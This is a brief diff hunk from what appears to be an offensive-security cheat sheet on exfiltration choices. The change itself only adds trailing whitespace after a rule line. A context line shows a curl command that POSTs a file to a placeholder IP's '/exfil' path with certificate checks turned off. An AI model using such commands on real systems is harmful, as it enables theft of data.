@@ -196,7 +196,7 @@ Need STEALTH?
   └── HTTPS only?           → curl -k -X POST https://IP/exfil -d @file
 ```
 
----
+--- 
 
 ## ⚠ Ethical Reminder
 
